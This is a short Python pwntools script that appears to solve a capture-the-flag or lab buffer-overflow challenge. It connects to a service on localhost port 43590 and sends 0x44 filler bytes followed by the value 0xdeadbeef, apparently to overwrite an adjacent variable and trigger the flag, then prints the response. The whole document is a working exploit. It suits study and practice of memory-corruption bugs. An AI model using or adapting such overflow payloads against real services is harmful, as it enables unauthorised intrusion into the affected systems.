from pwn import *


address = ("127.0.0.1", 43590)
payload = b"\x01" * 0x44 + b"\xef\xbe\xad\xde"

conn = remote(address[0], address[1])
conn.sendline(payload)

print(conn.recvall())
